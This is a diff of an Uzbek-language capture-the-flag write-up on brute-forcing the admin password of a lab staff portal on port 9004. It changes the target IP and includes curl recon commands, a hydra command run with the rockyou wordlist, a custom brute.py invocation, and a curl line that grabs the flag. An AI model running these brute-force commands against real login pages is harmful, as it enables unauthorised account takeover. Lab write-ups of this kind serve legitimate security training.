@@ -2,7 +2,8 @@
 
 **Challenge:** Acme staff portal, klassik POST login formasi, rate-limit yo'q.
 Admin akkaunti paroli oddiy wordlist (rockyou) ichida bor. Username: `admin`.
-**Target:** `http://10.15.0.238:9004/` (mashina IP: `10.15.1.54`)
+**Target:** `http://10.15.1.54:9004/`  ← shu ishlaydigan IP (lab kartadagi mashina IP).
+(`10.15.0.238` — challenge tavsifidagi manzil; ishlamasa, `10.15.1.54` bilan urining.)
 **Qoidalar:** faqat **9004** portga hujum. Remote — boxda shell yo'q. Flag formati: `HTB{...}`.
 
 ---
@@ -37,10 +38,10 @@ parolda chiqadigan matnni** aniqlang:
 
 ```bash
 # Login sahifani ko'rish
-curl -s -i http://10.15.0.238:9004/ | head -40
+curl -s -i http://10.15.1.54:9004/ | head -40
 
 # Bitta xato urinish qilib, xato matnini topish
-curl -s -i -X POST http://10.15.0.238:9004/login \
+curl -s -i -X POST http://10.15.1.54:9004/login \
      -d 'username=admin&password=wrongpass' | head -40
 ```
 
@@ -61,8 +62,8 @@ sudo apt-get install -y hydra wordlists        # rockyou: /usr/share/wordlists/r
 
 # Aniq buyruq (LOGIN_PATH va FAIL_STRING ni recon natijasiga qarab o'zgartiring)
 hydra -l admin -P /usr/share/wordlists/rockyou.txt \
-      -s 9004 -t 16 -f -V \
-      10.15.0.238 \
+      -s 9004 -t 8 -f -I -V \
+      10.15.1.54 \
       http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid"
 ```
 
@@ -91,8 +92,8 @@ Hydra o'rnatilmagan yoki CSRF/cookie bilan muammo bo'lsa:
 cd ctf/brute-force-staff-portal
 
 python3 brute.py \
-  --url        http://10.15.0.238:9004/login \
-  --login-page http://10.15.0.238:9004/ \
+  --url        http://10.15.1.54:9004/login \
+  --login-page http://10.15.1.54:9004/ \
   --username   admin \
   --user-field username \
   --pass-field password \
@@ -132,7 +133,7 @@ Parol topilgach, brauzer yoki curl bilan `admin` sifatida kiring va flagni oling
 PW='<TOPILGAN_PAROL>'
 curl -s -c /tmp/cj -b /tmp/cj -L \
      -d "username=admin&password=$PW" \
-     http://10.15.0.238:9004/login | grep -o 'HTB{[^}]*}'
+     http://10.15.1.54:9004/login | grep -o 'HTB{[^}]*}'
 ```
 
 Yoki brauzerda `http://10.15.0.238:9004/` → `admin` / `<parol>`.
